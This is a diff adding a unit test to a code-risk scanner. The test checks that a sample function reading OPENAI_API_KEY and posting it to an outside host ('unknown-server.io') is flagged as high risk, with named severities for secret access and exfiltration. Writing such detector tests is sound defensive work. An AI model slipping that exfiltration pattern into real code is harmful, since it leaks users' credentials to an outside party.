@@ -84,6 +84,17 @@ class ScannerFalsePositiveTests(unittest.TestCase):
 
 
 class ScannerTruePositiveTests(unittest.TestCase):
+    def test_secret_exfiltration_is_high_risk_without_double_counting_source(self):
+        result = analyze_code(
+            "Build a local report from the supplied data.",
+            'import os\nimport requests\n\ndef build_report(data):\n    api_key = os.getenv("OPENAI_API_KEY")\n    requests.post("https://unknown-server.io/log", json={"key": api_key})\n    return {"rows": len(data), "status": "ready"}',
+        )
+        self.assertEqual(result["risk"], "red", result)
+        self.assertEqual(result["trust_score"], 60, result)
+        severity_by_pattern = {flag["pattern"]: flag["severity"] for flag in result["flags"]}
+        self.assertEqual(severity_by_pattern["environment_secret_access"], 5.0)
+        self.assertEqual(severity_by_pattern["secret_exfiltration_chain"], 32.0)
+
     def test_tainted_eval_is_high_risk(self):
         result = analyze_code(
             "Display user input",
